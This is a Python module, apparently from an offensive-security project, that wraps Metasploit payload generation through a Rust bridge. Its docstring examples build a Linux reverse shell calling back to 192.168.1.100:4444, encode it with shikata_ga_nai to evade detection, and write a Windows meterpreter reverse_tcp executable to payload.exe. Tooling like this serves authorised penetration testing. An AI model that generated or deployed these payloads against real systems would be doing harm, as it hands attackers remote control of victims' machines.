"""MSF Payload generation.

Provides payload generation and encoding functionality.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from assassinate.bridge.core import Framework

try:
    import assassinate_bridge as _bridge  # type: ignore[import-not-found]
except ImportError as e:
    msg = (
        "assassinate_bridge Rust module not found. "
        "Please compile the Rust bridge first:\n"
        "  cd assassinate_bridge && cargo build --release"
    )
    raise ImportError(msg) from e


class PayloadGenerator:
    """MSF payload generator.

    Creates and encodes payloads in various formats (raw bytes, executables, etc.).
    """

    _instance: Any  # The underlying PyO3 PayloadGenerator instance

    def __init__(self, framework: Framework) -> None:
        """Initialize PayloadGenerator instance.

        Args:
            framework: Framework instance to use for payload generation.

        Raises:
            RuntimeError: If initialization fails.

        Example:
            >>> fw = Framework()
            >>> pg = PayloadGenerator(fw)
        """
        # Access framework's internal instance, not the Python wrapper
        framework_instance = framework._instance
        self._instance = _bridge.PayloadGenerator(framework_instance)  # type: ignore[attr-defined]

    def generate(
        self,
        payload_name: str,
        options: dict[str, str] | None = None,
    ) -> bytes:
        """Generate a payload.

        Args:
            payload_name: Name of the payload to generate.
            options: Optional payload options/configuration.

        Returns:
            Generated payload bytes.

        Raises:
            RuntimeError: If payload generation fails.
            ValueError: If payload_name is invalid.

        Example:
            >>> pg = PayloadGenerator(fw)
            >>> payload = pg.generate("linux/x86/shell_reverse_tcp",
            ...                       {"LHOST": "192.168.1.100",
            ...                        "LPORT": "4444"})
        """
        return bytes(self._instance.generate(payload_name, options))

    def generate_encoded(
        self,
        payload_name: str,
        encoder: str | None = None,
        iterations: int | None = 1,
        options: dict[str, str] | None = None,
    ) -> bytes:
        """Generate an encoded payload.

        Args:
            payload_name: Name of the payload to generate.
            encoder: Name of the encoder to use (e.g., "x86/shikata_ga_nai").
                If None, MSF will auto-select an encoder.
            iterations: Number of encoding iterations (default: 1).
            options: Optional payload options/configuration.

        Returns:
            Encoded payload bytes.

        Raises:
            RuntimeError: If payload generation or encoding fails.
            ValueError: If payload_name or encoder is invalid.

        Example:
            >>> pg = PayloadGenerator(fw)
            >>> encoded = pg.generate_encoded(
            ...     "linux/x86/shell_reverse_tcp",
            ...     encoder="x86/shikata_ga_nai",
            ...     iterations=3,
            ...     options={"LHOST": "192.168.1.100", "LPORT": "4444"}
            ... )
        """
        return bytes(
            self._instance.generate_encoded(payload_name, encoder, iterations, options)
        )

    def list_payloads(self) -> list[str]:
        """List all available payloads.

        Returns:
            List of payload names (e.g., ["linux/x86/shell_reverse_tcp", ...]).

        Raises:
            RuntimeError: If listing payloads fails.

        Example:
            >>> pg = PayloadGenerator(fw)
            >>> payloads = pg.list_payloads()
            >>> print(f"Available payloads: {len(payloads)}")
            Available payloads: 1680
        """
        return list(self._instance.list_payloads())

    def generate_executable(
        self,
        payload_name: str,
        platform: str,
        arch: str,
        options: dict[str, str] | None = None,
    ) -> bytes:
        """Generate a standalone executable payload.

        Args:
            payload_name: Name of the payload to generate.
            platform: Target platform (e.g., "windows", "linux", "osx").
            arch: Target architecture (e.g., "x86", "x64", "x86_64").
            options: Optional payload options/configuration.

        Returns:
            Executable payload bytes (EXE, ELF, Mach-O, etc.).

        Raises:
            RuntimeError: If executable generation fails.
            ValueError: If payload_name, platform, or arch is invalid.

        Example:
            >>> pg = PayloadGenerator(fw)
            >>> exe = pg.generate_executable(
            ...     "windows/meterpreter/reverse_tcp",
            ...     platform="windows",
            ...     arch="x86",
            ...     options={"LHOST": "192.168.1.100", "LPORT": "4444"}
            ... )
            >>> with open("payload.exe", "wb") as f:
            ...     f.write(exe)
        """
        return bytes(
            self._instance.generate_executable(payload_name, platform, arch, options)
        )

    def __repr__(self) -> str:
        """Return string representation of PayloadGenerator.

        Returns:
            String representation.
        """
        return "<PayloadGenerator>"
